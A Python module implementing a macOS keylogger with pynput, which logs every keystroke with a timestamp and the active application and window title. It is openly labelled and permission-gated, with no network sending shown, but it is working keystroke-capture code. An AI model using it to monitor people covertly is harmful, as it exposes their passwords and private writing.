"""
macOS keylogger using pynput. Requires Accessibility permission:
System Preferences → Security & Privacy → Privacy → Accessibility → add the app.
"""
import threading
import datetime
import subprocess

try:
    from pynput import keyboard
    _PYNPUT = True
except ImportError:
    _PYNPUT = False


def _active_app():
    try:
        script = (
            'tell application "System Events" to '
            'get name of first process whose frontmost is true'
        )
        app_name = subprocess.check_output(
            ["osascript", "-e", script], stderr=subprocess.DEVNULL
        ).decode().strip()

        # Get window title
        script2 = (
            f'tell application "System Events" to tell process "{app_name}" to '
            'get name of front window'
        )
        try:
            win_title = subprocess.check_output(
                ["osascript", "-e", script2], stderr=subprocess.DEVNULL
            ).decode().strip()
        except Exception:
            win_title = ""

        return f"{app_name} — {win_title}" if win_title else app_name
    except Exception:
        return "Unknown"


class Keylogger:
    def __init__(self, on_key):
        self._on_key = on_key

    def start(self):
        if not _PYNPUT:
            return
        t = threading.Thread(target=self._run, daemon=True, name="keylogger")
        t.start()

    def _run(self):
        _MODS = {
            keyboard.Key.shift, keyboard.Key.shift_l, keyboard.Key.shift_r,
            keyboard.Key.ctrl,  keyboard.Key.ctrl_l,  keyboard.Key.ctrl_r,
            keyboard.Key.alt,   keyboard.Key.alt_l,   keyboard.Key.alt_r,
            keyboard.Key.cmd,   keyboard.Key.caps_lock,
        }

        def _press(key):
            if key in _MODS:
                return
            now = datetime.datetime.now().strftime("%H:%M:%S")
            app = _active_app()
            try:
                char = key.char
                if not char:
                    return
            except AttributeError:
                name = getattr(key, "name", str(key)).upper()
                pretty = {
                    "ENTER": "↵", "BACKSPACE": "⌫", "SPACE": " ",
                    "TAB": "⇥", "DELETE": "⌦", "CAPS_LOCK": "⇪",
                    "UP": "↑", "DOWN": "↓", "LEFT": "←", "RIGHT": "→",
                    "ESC": "Esc",
                }.get(name, f"[{name}]")
                char = pretty
            self._on_key({"char": char, "time": now, "app": app})

        with keyboard.Listener(on_press=_press) as listener:
            listener.join()
